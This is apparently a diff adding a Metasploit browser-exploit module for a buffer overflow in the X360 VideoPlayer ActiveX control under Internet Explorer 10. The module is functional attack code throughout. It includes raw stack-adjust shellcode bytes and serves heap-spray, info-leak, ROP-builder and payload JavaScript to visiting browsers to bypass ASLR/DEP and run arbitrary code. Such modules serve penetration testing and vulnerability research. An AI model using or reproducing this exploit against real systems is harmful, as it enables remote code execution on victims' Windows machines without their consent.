@@ -1,0 +1,143 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::BrowserExploitServer
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'                => "X360 VideoPlayer ActiveX Control Buffer Overflow",
+      'Description'         => %q{
+        This module exploits a buffer overflow in the VideoPlayer.ocx ActiveX installed with the
+        X360 Software. By setting an overly long value to 'ConvertFile()',an attacker can overrun
+        a .data buffer to bypass ASLR/DEP and finally execute arbitrary code.
+      },
+      'License'             => MSF_LICENSE,
+      'Author'              =>
+        [
+          'Rh0',     # vulnerability discovery and exploit, all the hard work
+          'juan vazquez' # msf module
+        ],
+      'References'          =>
+        [
+          ['EDB', '35948'],
+          ['URL', 'https://rh0dev.github.io/blog/2015/fun-with-info-leaks/']
+        ],
+      'Payload'             =>
+        {
+          'Space'          => 1024,
+          'DisableNops'    => true,
+          'PrependEncoder' => stack_adjust
+        },
+      'DefaultOptions'      =>
+        {
+          'InitialAutoRunScript' => 'migrate -f'
+        },
+      'Platform'            => 'win',
+      'Arch'                => ARCH_X86,
+      'BrowserRequirements' =>
+        {
+          :source  => /script|headers/i,
+          :clsid   => "{4B3476C6-185A-4D19-BB09-718B565FA67B}",
+          :os_name => OperatingSystems::Match::WINDOWS,
+          :ua_name => Msf::HttpClients::IE,
+          :ua_ver  => '10.0'
+        },
+      'Targets'             =>
+        [
+          [ 'Automatic', {} ]
+        ],
+      'Privileged'          => false,
+      'DisclosureDate'      => "Jan 30 2015",
+      'DefaultTarget'       => 0))
+  end
+
+  def stack_adjust
+    adjust = "\x64\xa1\x18\x00\x00\x00"  # mov eax, fs:[0x18 # get teb
+    adjust << "\x83\xC0\x08"             # add eax, byte 8 # get pointer to stacklimit
+    adjust << "\x8b\x20"                 # mov esp, [eax] # put esp at stacklimit
+    adjust << "\x81\xC4\x30\xF8\xFF\xFF" # add esp, -2000 # plus a little offset
+
+    adjust
+  end
+
+  def on_request_exploit(cli, request, target_info)
+    print_status("Request: #{request.uri}")
+
+    case request.uri
+    when /exploit.js/
+      print_status("Sending exploit.js...")
+      headers = {'Pragma' => 'no-cache', 'Content-Type'=>'application/javascript'}
+      send_exploit_html(cli, exploit_template(cli, target_info), headers)
+    when /sprayer.js/
+      print_status("Sending sprayer.js...")
+      headers = {'Pragma' => 'no-cache', 'Content-Type'=>'application/javascript'}
+      send_exploit_html(cli, sprayer_template(cli, target_info), headers)
+    when /informer.js/
+      print_status("Sending informer.js...")
+      headers = {'Pragma' => 'no-cache', 'Content-Type'=>'application/javascript'}
+      send_exploit_html(cli, informer_template(cli, target_info), headers)
+    when /rop_builder.js/
+      print_status("Sending rop_builder.js...")
+      headers = {'Pragma' => 'no-cache', 'Content-Type'=>'application/javascript'}
+      send_exploit_html(cli, rop_builder_template(cli, target_info), headers)
+    else
+      print_status("Sending main.html...")
+      headers = {'Pragma' => 'no-cache', 'Content-Type'=>'text/html'}
+      send_exploit_html(cli, main_template(cli, target_info), headers)
+    end
+  end
+
+  def main_template(cli, target_info)
+    path = ::File.join(Msf::Config.data_directory, 'exploits', 'edb-35948', 'main.html')
+    template = ''
+    File.open(path, 'rb') { |f| template = strip_comments(f.read) }
+
+    return template, binding()
+  end
+
+  def exploit_template(cli, target_info)
+    shellcode = Rex::Text.to_hex(get_payload(cli, target_info))
+
+    path = ::File.join(Msf::Config.data_directory, 'exploits', 'edb-35948', 'js', 'exploit.js')
+    template = ''
+    File.open(path, 'rb') { |f| template = strip_comments(f.read) }
+
+    return template, binding()
+  end
+
+  def sprayer_template(cli, target_info)
+    path = ::File.join(Msf::Config.data_directory, 'exploits', 'edb-35948', 'js', 'sprayer.js')
+    template = ''
+    File.open(path, 'rb') { |f| template = strip_comments(f.read) }
+
+    return template, binding()
+  end
+
+  def informer_template(cli, target_info)
+    path = ::File.join(Msf::Config.data_directory, 'exploits', 'edb-35948', 'js', 'informer.js')
+    template = ''
+    File.open(path, 'rb') { |f| template = strip_comments(f.read) }
+
+    return template, binding()
+  end
+
+  def rop_builder_template(cli, target_info)
+    path = ::File.join(Msf::Config.data_directory, 'exploits', 'edb-35948', 'js', 'rop_builder.js')
+    template = ''
+    File.open(path, 'rb') { |f| template = strip_comments(f.read) }
+
+    return template, binding()
+  end
+
+  def strip_comments(input)
+    input.gsub(/\/\/.*$/, '')
+  end
+
+end
